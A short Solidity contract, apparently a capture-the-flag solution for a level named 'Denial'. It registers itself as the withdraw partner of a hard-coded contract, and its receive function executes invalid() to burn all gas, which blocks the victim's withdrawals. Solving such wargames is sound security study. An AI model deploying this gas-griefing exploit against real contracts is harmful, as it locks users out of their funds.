// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

contract L21_Caller__Denial {
    address denialAddress = 0xC02Ca204e813122531a220B2B0Ff3ee4D4cb5cf3;

    constructor() {
        (bool _success, ) = denialAddress.call(
            abi.encodeWithSignature(
                "setWithdrawPartner(address)",
                address(this)
            )
        );
        require(_success, "setWithdrawPartner failed");
    }

    receive() external payable {
        assembly {
            invalid()
        }
    }
}
